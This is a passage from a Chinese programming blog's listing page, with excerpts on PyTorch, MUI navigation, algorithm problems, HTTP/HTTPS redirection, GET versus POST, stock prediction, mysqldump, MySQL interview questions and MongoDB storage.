import torch as t from torch.nn import Module from torch import nn from torch.nn import functional as F class Net(Module): def __init__(self): super(Net,self).__init__() self.conv1 = nn.Conv2d(3,32,3,1) self.conv2 = nn.Conv2d(32,3,3,1) self.w = nn.Parameter(t.randn(3,10)) for p in self.children(): nn.init.xavier_normal_(p.weight.data) nn.init.constant_(p.bias.data, 0) def forward(self, x): out = self.conv1(x) out = self.conv2(x) out = F.avg_pool2d(out,(out.shape[2],out.shape[3])) out = F.linear(out,weight=self.w) return out 然后我们保存这个网络的初始值。
model = Net() t.save(model.state_dict(),'xxx.pth') 现在我们将Net修改一下，多加几个卷积层，但并不加入到forward中，仅仅出于少些几行的目的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b866c912139e8155cc473e81ede72ea6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e39656e1c19038ab8b230dd5bd59e77/" rel="bookmark">
			MUI的返回和刷新处理方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		//mui-action-back系统默认的返回不能返回，就直接关闭当前页面的处理 mui.back = function() { plus.webview.currentWebview().close(); } 1. //在父页面中添加事件监听 window.addEventListener('refresh', function(e) { location.reload(); }) //这样，在子页面执行返回操作mui.back()的时候，会执行父页面中的refesh事件，即location.reload()，刷新父页面； 2. //点击按钮取消 function cancel(){ mui.back();//返回上级页面 } 3.1
//刷新并返回 var old_back = mui.back; //将返回事件储存 mui.back = function() { // 获取目标口窗口对象 var target = plus.webview.getLaunchWebview();//获取首次进入主页的对象 // 执行相应的事件（刷新） target.reload(); // 执行关闭（返回） old_back(); }; 3.2
//页面A到B的跳转 mui('.mui-bar').on('tap', '.handover', function() { mui.openWindow({ url: 'orderlist.html?id=' + id, id: 'orderlist.html', //下个页面返回需要用到的ID styles: { top: '0px', bottom: '0px' }, show: { aniShow: 'none', } }) }) //延时返回 setTimeout(function(){ //刷新B返回A var old_back = mui.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e39656e1c19038ab8b230dd5bd59e77/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55184e1e68294e29bf35806197584948/" rel="bookmark">
			各个版本windows镜像
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 找了很久纯净版的Windows,为了以后方便，
链接 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a8db0c569baec632fbccdeeb0f7678d/" rel="bookmark">
			剑指Offer----矩阵中的路径（递归回溯法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		时间限制：1秒 空间限制：32768K 热度指数：134786
算法知识视频讲解
题目描述 请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一个格子开始，每一步可以在矩阵中向左，向右，向上，向下移动一个格子。如果一条路径经过了矩阵中的某一个格子，则之后不能再次进入这个格子。 例如 a b c e s f c s a d e e 这样的3 X 4 矩阵中包含一条字符串"bcced"的路径，但是矩阵中不包含"abcb"路径，因为字符串的第一个字符b占据了矩阵中的第一行第二个格子之后，路径不能再次进入该格子。
AC code class Solution { int r; int c; bool flag[100][100]; public: bool findpath(char**p, int rows, int cols, char* str) { if (*str =='\0')return true; if (rows &gt;= r || cols &gt;= c || rows &lt; 0 || cols &lt; 0) return false; flag[rows][cols] = true; if (p[rows][cols] == *str) { int rest = false; if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5a8db0c569baec632fbccdeeb0f7678d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b9a391807514d2924a60a67a0ae5253/" rel="bookmark">
			输入网址的时候，浏览器是如何判断你是http协议还是https协议的
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.问题
拿淘宝来说事。
在浏览器中通常人们输入淘宝的网址有taobao.com www.taobao.com http://www.taobao.com
而最终浏览器中的显示的网址是https://www.taobao.com,这是怎么实现的呢？
2.taobao.com -&gt; www.taobao.com
taobao.com 和www.taobao.com是不同的域名，淘宝会把相似的域名都买下来，都定向到同一个域名下。
当输入taobao.com 返回的是302重定向，使浏览器访问www.taobao.com
而百度的实现方式的通过返回 刷新元信息 http://www.baidu.com/“&gt;
使浏览器刷新到www.baidu.com，实现原理大抵相似。
3.http://www.taobao.com -&gt; https://www.taobao.com
http默认端口是80，https默认端口是443。
很多网站都提供https服务，为了避免用户输入http导致访问80端口出现访问不通的情况，同时也是为了与http版本的网站兼容，服务器监听80端口，对所有的80端口的访问都定向到https的url，实现方式都多种，最简单的就是使用302重定向，将其重定向到https://www.taobao.com
这实现了http-&gt;https,但是不能每次都重定向，http协议实现了一个叫做HSTS机制。返回的302报文中有这样一条
Strict-Transport-Security: max-age=31536000\r\n
其含义是强制浏览器在max-age到期之前，把所有的http://www.taobao.com自动转换成https://www.taobao.com
是浏览器实现的url转换，不用每次访问两次服务器，一步到位。这样避免了302跳转80-&gt;443的中间人劫持的问题。所以之后每次访问就不会出现302了，只有第一次会出现。
小结
通过上面的案例可以知道，浏览器默认的端口一直都是80端口，也就是说默认情况下它是走的http协议，那么为了让它通过https协议来访网站，服务器实际上做了这些事情。
1.使用http协议并监听80端口，等待浏览器的访问.
2.在监听的80端口上设置url重定向，指向监听端口为443的https协议的网站
3.通过这样一种方式就可以实现网站地址的重定向了。
因此，即使你输入http://www.baidu.com:80,做了重定向的服务器也会将此url修改为https://www.baidu.com:443。也就是说，实际判断的过程是由服务器来保证的，浏览器的默认端口一直都是80端口。
---------------------
作者：逃离地球的小小呆
来源：CSDN
原文：https://blog.csdn.net/gui951753/article/details/82227800
版权声明：本文为博主原创文章，转载请附上博文链接！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3309aee663ba80ccf9716da86318d510/" rel="bookmark">
			剑指offer----数字在排序数组中出现的次数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 时间限制：1秒 空间限制：32768K 热度指数：187371
本题知识点： 数组
算法知识视频讲解
题目描述 统计一个数字在排序数组中出现的次数。
AC code 二分法差找
class Solution { public: int GetNumberOfK(vector&lt;int&gt; data ,int k) { if(data.size() &lt;= 0) return 0; int low = 0; int high = data.size() - 1; while(low &lt; high &amp;&amp; k != data[(low + high) / 2]){ if(data[(low + high) / 2] &gt; k){ high--; }else if(data[(low + high) / 2] &lt; k){ low++; } } if(data[(low + high) / 2] == k){ int indexN; int indexP = indexN = (low + high) / 2; while(data[indexP] == k)indexP--; while(data[indexN] == k)indexN++; return indexN - indexP - 1; } return 0; } }; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b37a7b74995284174159aacad60593ea/" rel="bookmark">
			GET和POST两种基本请求方法的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GET和POST是HTTP请求的两种基本方法，要说它们的区别，接触过WEB开发的人都能说出一二。
最直观的区别就是GET把参数包含在URL中，POST通过request body传递参数。
你可能自己写过无数个GET和POST请求，或者已经看过很多权威网站总结出的他们的区别，你非常清楚知道什么时候该用什么。
当你在面试中被问到这个问题，你的内心充满了自信和喜悦。
你轻轻松松的给出了一个“标准答案”：
GET在浏览器回退时是无害的，而POST会再次提交请求。
GET产生的URL地址可以被Bookmark，而POST不可以。
GET请求会被浏览器主动cache，而POST不会，除非手动设置。
GET请求只能进行url编码，而POST支持多种编码方式。
GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。
GET请求在URL中传送的参数是有长度限制的，而POST么有。
对参数的数据类型，GET只接受ASCII字符，而POST没有限制。
GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。
GET参数通过URL传递，POST放在Request body中。
（本标准答案参考自w3schools）
“很遗憾，这不是我们要的回答！”
请告诉我真相。。。
如果我告诉你GET和POST本质上没有区别你信吗？ 让我们扒下GET和POST的外衣，坦诚相见吧！
GET和POST是什么？HTTP协议中的两种发送请求的方法。
HTTP是什么？HTTP是基于TCP/IP的关于数据如何在万维网中如何通信的协议。
HTTP的底层是TCP/IP。所以GET和POST的底层也是TCP/IP，也就是说，GET/POST都是TCP链接。GET和POST能做的事情是一样一样的。你要给GET加上request body，给POST带上url参数，技术上是完全行的通的。 那么，“标准答案”里的那些区别是怎么回事？
在我大万维网世界中，TCP就像汽车，我们用TCP来运输数据，它很可靠，从来不会发生丢件少件的现象。但是如果路上跑的全是看起来一模一样的汽车，那这个世界看起来是一团混乱，送急件的汽车可能被前面满载货物的汽车拦堵在路上，整个交通系统一定会瘫痪。为了避免这种情况发生，交通规则HTTP诞生了。HTTP给汽车运输设定了好几个服务类别，有GET, POST, PUT, DELETE等等，HTTP规定，当执行GET请求的时候，要给汽车贴上GET的标签（设置method为GET），而且要求把传送的数据放在车顶上（url中）以方便记录。如果是POST请求，就要在车上贴上POST的标签，并把货物放在车厢里。当然，你也可以在GET的时候往车厢内偷偷藏点货物，但是这是很不光彩；也可以在POST的时候在车顶上也放一些数据，让人觉得傻乎乎的。HTTP只是个行为准则，而TCP才是GET和POST怎么实现的基本。
但是，我们只看到HTTP对GET和POST参数的传送渠道（url还是requrest body）提出了要求。“标准答案”里关于参数大小的限制又是从哪来的呢？
在我大万维网世界中，还有另一个重要的角色：运输公司。不同的浏览器（发起http请求）和服务器（接受http请求）就是不同的运输公司。 虽然理论上，你可以在车顶上无限的堆货物（url中无限加参数）。但是运输公司可不傻，装货和卸货也是有很大成本的，他们会限制单次运输量来控制风险，数据量太大对浏览器和服务器都是很大负担。业界不成文的规定是，（大多数）浏览器通常都会限制url长度在2K个字节，而（大多数）服务器最多处理64K大小的url。超过的部分，恕不处理。如果你用GET服务，在request body偷偷藏了数据，不同服务器的处理方式也是不同的，有些服务器会帮你卸货，读出数据，有些服务器直接忽略，所以，虽然GET可以带request body，也不能保证一定能被接收到哦。
好了，现在你知道，GET和POST本质上就是TCP链接，并无差别。但是由于HTTP的规定和浏览器/服务器的限制，导致他们在应用过程中体现出一些不同。 你以为本文就这么结束了？
我们的大BOSS还等着出场呢。。。
这位BOSS有多神秘？当你试图在网上找“GET和POST的区别”的时候，那些你会看到的搜索结果里，从没有提到他。他究竟是什么呢。。。
GET和POST还有一个重大区别，简单的说：
GET产生一个TCP数据包；POST产生两个TCP数据包。
长的说：
对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；
而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。
也就是说，GET只需要汽车跑一趟就把货送到了，而POST得跑两趟，第一趟，先去和服务器打个招呼“嗨，我等下要送一批货来，你们打开门迎接我”，然后再回头把货送过去。
因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑！跳入需谨慎。为什么？
1. GET与POST都有自己的语义，不能随便混用。
2. 据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。
3. 并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。
现在，当面试官再问你“GET与POST的区别”的时候，你的内心是不是这样的？
结束！！！
转载自：https://www.cnblogs.com/logsharing/p/8448446.html
了解更多：http://www.cnblogs.com/whatmiss/p/8461178.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/519bc174ac71dccdb99dca8b7f48b4c3/" rel="bookmark">
			为了预测股票，我用TensorFlow深度学习了股市数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		完整源码可在微信公众号：「01二进制」后台回复：「股市分析」获取
阅读此文前建议先阅读《找对象的过程中，我竟然理解了什么是机器学习！》
前言 相信大家这几天或多或少的都开始关注到股市了，虽然我还不是很懂里面的一些套路，但是从最近各个公众号的推送里面，我也看到最近的股市确实是形势大好。对很多人来说，股票就和房价一样，他的升与降牵动着众多人的心。这几天很多qq群、微信群都开始讨论起股票了，各位坊间大神也纷纷开始预测各种股票走势了。
股票价格是典型的时间序列数据（简称时序数据），会受到经济环境、政府政策、人为操作多种复杂因素的影响，所以说股票价格预测是一件非常唬人的事情。但是基于历史数据，以股票价格为例，介绍如何对时序数据进行预测，仍然值得一做。
不过今天我们不聊股市，因为我也不是很懂，今天我们来聊聊我们知道的东西。如今深度学习在金融市场的应用越来越广泛，我们能否利用已有的历史数据通过深度学习的方式来进行预测呢？
准备工作 答案自然是可以的，虽然我们无法非常准确的进行预测，但是作为一个深度学习入手的项目是完完全全可以的。
实验环境 老样子，以免出现因环境导致的问题，先将实验环境列出：
MacOS 10.14.3Python 3.6.8（Anaconda）Jupyter Notebook使用的包有： TensorFlowKerasmatplotlibpandas 数据 此次实验，我们采用STATWORX的S&amp;P 500股价数据，该数据集爬取自Google Finance API，已经进行过缺失值处理。他们的官方网站是：www.statworx.com/。
数据集可在微信公众号：「01二进制」后台回复：「股市数据集」获取
数据预览 在这里我们还是使用pandas，主要用于数据清洗和整理
import pandas as pd data=pd.read_csv('data/data_stocks.csv') data.info() 复制代码 执行data.info()可以查看特征的概要：
&lt;class 'pandas.core.frame.DataFrame'&gt; RangeIndex: 41266 entries, 0 to 41265 Columns: 502 entries, DATE to NYSE.ZTS dtypes: float64(501), int64(1) memory usage: 158.0 MB 复制代码 从上述结果可知：该数据集数据共502列，41266行，502列分别为：
DATE：该行数据的时间戳SP500：可以理解为大盘指数其他：可以理解为500支个股的股价 查看数据的前五行
data.head() 复制代码 绘制大盘趋势折线图
plt.plot(data['SP500']) 复制代码 结果如下：
Tips：此次实验的调试环境为Jupyter Notebook，我们最好在开头导入matplotlib包的时候在加一行%matplotlib inline，这样就可以在Jupyter Notebook中内嵌绘图，并且省略掉plt.show()这一步。
数据整理 在这里，我们需要将数据集分为训练和测试数据。分配比为8:2，即训练数据包含总数据集的80％。当然在这之前我们需要先将DATE这个无关变量舍去。
data.drop('DATE', axis=1, inplace=True) data_train = data.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/519bc174ac71dccdb99dca8b7f48b4c3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/308da2cfdc150544683a28f35b0a40dd/" rel="bookmark">
			易飞 取消库位规格书
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		分享一下我老师大神的人工智能教程。零基础！通俗易懂！风趣幽默！还带黄段子！希望你也加入到我们人工智能的队伍中来！https://blog.csdn.net/jiangjunshow
程序代号： CMSB07 程序名称： 取消库位管理 Parent Class： 系统分析代号： 信息文件：BOMTD (R/W) 组合单单头 BOMTE (R/W) 组合单单身 BOMTF (R/W) 拆解单单头 BOMTG (R/W) 拆解单单身 CMSMA (R/W) 公用参数档 CMSNI (R/W) 仓库库位档 COPTH (R/W) 销货单单身信息档 COPTJ (R/W) 销退单单身信息档 COPTO (R/W) 出货通知单身档 CUSTN (R/W) 交易单据单身档 DHQTE (R/W) 调拨出库单身档 DHQTG (R/W) 调拨出库到达单身档 DHQTM (R/W) 调拨退库到达单身档 EPSTB (R/W) 出货通知单身 EPSTC (R/W) 包装明细信息档 GMPTH (R/W) 留样单信息档 GMPTI (R/W) 留样检验单头信息档 GMPTL (R/W) 养护检验单头信息档 INVMC (R/W) 品号仓库档 INVML (R/W) 品号仓库库位批号档 INVTB (R/W) 交易单据单身档 INVTC (R/W) 盘点底稿信息档单身 INVTD (R/W) 盘点信息汇总档 INVTG (R/W) 借出入调拨单身档 INVTI (R/W) 借出入归还单身档 INVTK (R/W) 成本开账/调整单身档 INVTM (R/W) 报废单单身档 INVTO (R/W) 销毁单单身档 INVLA (R/W) 交易明细信息档 INVLE (R/W) 品号月档子单身 KBSMM (R/W) 看板序号维护单身档 KBSTF (R/W) 刷读产生生产入库单单身档 KBSTI (R/W) 刷读产生调拨单单身档 KBSTK (R/W) 刷读产生销货单单身档 MOCTE (R/W) 领/退料单身档 MOCTG (R/W) 生产入库单身档 MOCTI (R/W) 委外进货单身档 MOCTL (R/W) 委外退货单身档 PURTH (R/W) 进货单单身信息档 PURTJ (R/W) 退货单单身信息档 QMSTA (R/W) 进货检验单单头档 QMSTD (R/W) 委外进货检验单单头档 QMSTG (R/W) 生产入库检验单单头档 QMSTJ (R/W) 转移检验单单头档 RMATD (R/W) 维修单单身档 SFCTC (R/W) 转移单单身档
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/308da2cfdc150544683a28f35b0a40dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9df5c09527a2d4b7dbde5aa6cfee47e2/" rel="bookmark">
			caffe源码分析---AP与mAP计算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Precision、Recall、P-R曲线 Percision 评估所有检测为positive的结果中，有多少是真的positive。
P r e c i s i o n = T P T o t a l _ P r e d i c t e d _ P o s i t i v e = T P T P + F P Precision = \frac{TP}{Total\_Predicted\_Positive} = \frac{TP}{TP + FP} Precision=Total_Predicted_PositiveTP​=TP+FPTP​
Recall 评估所有真的positive中，有多少positive被准确检测出。
R e c a l l = T P T o t a l _ A c t u a l _ P o s i t i v e = T P T P + F N Recall = \frac{TP}{Total\_Actual\_Positive} = \frac{TP}{TP + FN} Recall=Total_Actual_PositiveTP​=TP+FNTP​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9df5c09527a2d4b7dbde5aa6cfee47e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d907c91d369a1aa8913c74a09aa28303/" rel="bookmark">
			mysqldump 原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Single-transaction 与锁表时间有关
打开 show variable like '%gen%'
先建回滚点，然后打开，然后释放
$ &gt;&gt; mysqldump -uroot -p --protocol=TCP --port=$port --single-transaction --databases testdb &gt; 1.sql
=========================================================================================================== 180226 12:18:00 332732 Connect root@127.0.0.1 on 332732 Connect Access denied for user 'root'@'127.0.0.1' (using password: YES)
180226 12:18:04 332733 Connect root@127.0.0.1 on 332733 Query /*!40100 SET @@SQL_MODE='' */
332733 Query /*!40103 SET TIME_ZONE='+00:00' */
332733 Query SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ ///将事物隔离级别设置为可重复读
332733 Query START TRANSACTION /*!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d907c91d369a1aa8913c74a09aa28303/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5a3fe03264d95b46c516c477b696610/" rel="bookmark">
			解决Outlook新建 回复和转发邮件时字体变大的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		分享一下我老师大神的人工智能教程。零基础！通俗易懂！风趣幽默！还带黄段子！希望你也加入到我们人工智能的队伍中来！https://blog.csdn.net/jiangjunshow
解决Outlook新建、回复和转发邮件时字体变大的问题 今日接到一个同事报障说Outlook有问题，明明设置了9号字体但显示出来仍然很大。连接过去一看，果然无论是新建、回复还是转发邮件，显示的字体都是超大的。。因为里面有自动插入签名，开始还以为是签名的模板设置的字体太大，经检查发现一切正常，再看其它可以调整字号的位置，都是默认的设置。并未发现异常，找了好久，实在耗不住，没办法，只好跟用户说，现在没办法解决，等我回去再研究一下。然后关掉连接。但又不甘心，于是在自己的电脑里继续再找问题，还好，运气不错，终于还是被我找到了问题所在。一个很小的问题，却花了大量的时间，看来对常用软件设置不熟悉还是不行的。有空得看个透澈！
解决办法是这样的：
打开Outlook，新建或者回复一封邮件，然后点击邮件正文区域，再点邮件窗口菜单上边的“视图”-“显示比例”自己酌情调整到合适比例然后确定即可。记得要先点击邮件正文区域，让光标在那位置上闪烁，否则“显示比例”选项为灰，不可使用。如下图：
虽然没半点技术含量，但还是写出来共享给那些一时没注意到问题所在的朋友。
分享一下我老师大神的人工智能教程。零基础！通俗易懂！风趣幽默！还带黄段子！希望你也加入到我们人工智能的队伍中来！https://blog.csdn.net/jiangjunshow
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/690301bd85dac61e9309c4bf5dea5122/" rel="bookmark">
			50道MySQL面试题，掌握之后你将获得无上法力，一发不可收拾！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL面试题50道，精彩集锦！ Mysql中有哪几种锁？
1.表级锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高，并发度最低。
2.行级锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低，并发度也最高。
3. 页面锁：开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般。
Mysql中有哪些不同的表格？
共有5种类型的表格： MyISAM Heap Merge INNODB ISAM 简述在MySQL数据库中MyISAM和InnoDB的区别
MyISAM：
不支持事务，但是每次查询都是原子的；
支持表级锁，即每次操作是对整个表加锁；
存储表的总行数；
一个MYISAM表有三个文件：索引文件、表结构文件、数据文件；
采用菲聚集索引，索引文件的数据域存储指向数据文件的指针。辅索引与主索引基本一致，但是辅索引不用保证唯一性。
InnoDb：
支持ACID的事务，支持事务的四种隔离级别；
支持行级锁及外键约束：因此可以支持写并发；
不存储总行数；
一个InnoDb引擎存储在一个文件空间（共享表空间，表大小不受操作系统控制，一个表可能分布在多个文件里），也有可能为多个（设置为独立表空，表大小受操作系统文件大小限制，一般为2G），受操作系统文件大小的限制；
主键索引采用聚集索引（索引的数据域存储数据文件本身），辅索引的数据域存储主键的值；因此从辅索引查找数据，需要先通过辅索引找到主键值，再访问辅索引；最好使用自增主键，防止插入数据时，为维持B+树结构，文件的大调整。
Mysql中InnoDB支持的四种事务隔离级别名称，以及逐级之间的区别？
SQL标准定义的四个隔离级别为：
read uncommited ：读到未提交数据 read committed：脏读，不可重复读 repeatable read：可重读 serializable ：串行事物 CHAR和VARCHAR的区别？
1.CHAR和VARCHAR类型在存储和检索方面有所不同
2.CHAR列长度固定为创建表时声明的长度，长度值范围是1到255
当CHAR值被存储时，它们被用空格填充到特定长度，检索CHAR值时需删除尾随空格。 主键和候选键有什么区别？
表格的每一行都由主键唯一标识,一个表只有一个主键。 主键也是候选键。按照惯例，候选键可以被指定为主键，并且可以用于任何外键引用。 myisamchk是用来做什么的？
它用来压缩MyISAM表，这减少了磁盘或内存使用。 MyISAM Static和MyISAM Dynamic有什么区别？ 在MyISAM Static上的所有字段有固定宽度。动态MyISAM表将具有像TEXT，BLOB等字段，以适应不同长度的数据类型。 MyISAM Static在受损情况下更容易恢复。 如果一个表有一列定义为TIMESTAMP，将发生什么？
每当行被更改时，时间戳字段将获取当前时间戳。 列设置为AUTO INCREMENT时，如果在表中达到最大值，会发生什么情况？ 它会停止递增，任何进一步的插入都将产生错误，因为密钥已被使用。 怎样才能找出最后一次插入时分配了哪个自动增量？ LAST_INSERT_ID将返回由Auto_increment分配的最后一个值，并且不需要指定表名称。 你怎么看到为表格定义的所有索引？
索引是通过以下方式为表格定义的： SHOW INDEX FROM
&lt;tablename&gt;; LIKE声明中的％和_是什么意思？
％对应于0个或更多字符，_只是LIKE语句中的一个字符。 如何在Unix和Mysql时间戳之间进行转换？ UNIX_TIMESTAMP是从Mysql时间戳转换为Unix时间戳的命令
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/690301bd85dac61e9309c4bf5dea5122/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0b7a320d692ad542081a22312c94730/" rel="bookmark">
			浅析MongoDB数据库的海量数据存储应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		分享一下我老师大神的人工智能教程。零基础！通俗易懂！风趣幽默！还带黄段子！希望你也加入到我们人工智能的队伍中来！https://blog.csdn.net/jiangjunshow
原文地址 http://www.cnblogs.com/nbpowerboy/p/4325692.html
【摘要】当今已进入大数据时代，特别是大规模互联网web2.0应用不断发展及云计算所需要的海量存储和海量计算发展，传统的关系型数据库已无法满足这方面的需求。随着NoSQL数据库的不断发展和成熟，可以较好地解决海量存储和海量计算方面的应用需求。本文重点描述作为NoSQL之一MongoDB数据库在海量数据存储方面的应用。
1 引言
NoSQL,全称是“Not Only Sql”，指的是非关系型的数据库。这类数据库主要有这些特点：非关系型的、分布式、开源的、水平可扩展的。原始目的是为了大规模web应用，这场全新的数据库革命运动早期就有人提出，发展至2009年趋势越发高涨。非关系型的数据存储通常的应用如：模式自有、支持简易复制、简单的API、最终的一致性（非ACID）、大容量数据等。它的种类繁多，如列式数据库（Hadoop/HBase、Cassandra、Hypertable、Amazon SimpleDB等）、文档型数据库（MongoDB、CouchDB、OrientDB等）、键值数据库（Azure Table Storage、MEMBASE、Redis、Berkeley DB、MemcacheDB等）、图形数据库（Neo4J、Infinite Graph、Sones、Bigdata等）、面向对象数据库（db4o、Versant、Objectivity、Starcounter等）、网格及云数据库（GigaSpaces、Queplix、Hazelcast等）、XML数据库（Mark Logic Server、EMC Documentum xDB、BaseX、Berkeley DB XML等）、多值数据库（U2、OpenInsight、OpenQM等）及其他非关系型数据库（如FileDB）等。
MongoDB属于NoSQL数据的一种，是由10gen公司提供的一个开源的、模式自由的、面向文档存储的、分布式的数据库，是一个介于关系数据库和非关系数据库之间的产品。由C++语言编写，旨在为Web应用提供可扩展的高性能数据存储解决方案。他支持的数据结构非常松散，是类似Json的Bson格式，因此可以存储比较复杂的数据类型。
他可以运行在Solaris、Linux、Windows和OSX平台上，支持32位和64位应用，其中在32位应用中单个数据库最大容量为2G，在64位应用中存储容量大小只与实际存储空间大小有关，并且提供了Java、C#、PHP、C、C++、Javascript、Python、Ruby、Perl等多种语言的驱动程序，最新的生产版本为2.0，官方下载地址：http://www.mongodb.org/downloads。目前正在使用他的网站和企业已超过了100家，如视觉中国、大众点评网、淘宝网、盛大、Foursquare、Wordnik、OpenShift、SourceForge、Github等。
随着企业数据不断积累和增加及Web2.0应用不断向前发展，已进入了个人信息时代，对于大中型企业来说，可能每天将产生大量的数据，来之于各类系统，如各类文档(OA文档、项目文档等)、设计图纸、高清图片、视频等，对于员工来说，更关心的是个人信息方面的存储和计算，当这些信息量足够大时，想要实时提取或分析数据，传统集中式方式难以满足这方面的需求，因此采用分布式的存储和计算成为必然的选择，一方面主要解决海量存储问题，另一方面解决海量计算问题。采用MongoDB的数据库技术能有效地解决分布式方面的应用，本文重点分析MongoDB在海量数据存储方面的应用。
2 概述
2.1 MongoDB的主要特点
（1）文件存储格式为Bson，使用易于掌握和理解的Json风格语法。相对Json来说，Bson拥有更好的性能，主要表现为更快的遍历速度、操作更简易、增加了额外的
数据类型。
（2）模式自由，支持嵌入子文档和数组，无需事先创建数据结构，属于逆规范化的数据模型，有利于提高查询速度。
（3）动态查询，支持丰富的查询表达式，使用Json形式的标记，可轻易查询文档中内嵌的对象和数组及子文档。
（4）完整的索引支持，包括文档内嵌对象和数据，同时还提供了全文索引方式，MongoDB的查询优化器会分析查询表达式，并生成一个高效的查询计划。
（5）使用高效的二进制数据存储，适合存储大型对象（如高清图片、视频等）。
（6）支持多种复制模式，提供冗余及自动故障转移。支持Master-Slave、Replica Pairs/Replica Sets、有限Master-Master模式。
（7）支持服务端脚本和Map/Reduce，可以实现海量数据计算，即实现云计算功能。
（8）性能高、速度快。在多数场合，其查询速度对于MySQL要快的多，对于CPU占用非常小。部署很简单，几乎是零配置。
（9）自动处理碎片，支持自动分片功能实现水平扩展的数据库集群，可以动态添加或移除节点。
（10）内置GridFS，支持海量存储。
（11）可通过网络访问，采用高效的MongoDB网络协议，在性能方面要优于http或Rest协议。
（12）第三方支持丰富，MongoDB社区活跃，越来越多的公司和网站在生产环境中使用MongoDB进行技术架构优化，同时由10gen公司官方提供强大技术支持。
2.2 MongoDB的适用场景
MongoDB的主要目标是在键/值存储方式（提供了高性能和高度伸缩性）以及传统的RDBMS系统（丰富的功能）架起一座桥梁，集两者的优势于一身。
（1）网站数据：MongoDB非常适合实时的插入，更新与查询，并具备网站实时数据存储所需的复制及高度伸缩性。
（2）缓存：由于性能很高，MongoDB也适合作为信息基础设施的缓存层。在系统重启之后，由MongoDB搭建的持久化缓存层可以避免下层的数据源过载。
（3）大尺寸，低价值的数据：使用传统的关系型数据库存储一些数据时可能会比较昂贵，在此之前，很多时候程序员往往会选择传统的文件进行存储。
（4）高伸缩性的场景：MongoDB非常适合由数十或数百台服务器组成的数据库。MongoDB的路线图中已经包含对MapReduce
引擎的内置支持。
（5）用于对象及JSON数据的存储：MongoDB的Bson数据格式非常适合文档化格式的存储及查询。
2.3 MongoDB的体系结构
MongoDB是由一系列物理文件（数据文件，日志文件等）的集合与之对应的逻辑结构（集合、文档等）构成的数据库。
MongoDB的逻辑结构实际是一种层次结构，由文档（document，相当于关系数据库中的row）、集合（collection，相当于关系数据库中的table）、数据库（database，相当于关系数据库中的database）这三部分组成。
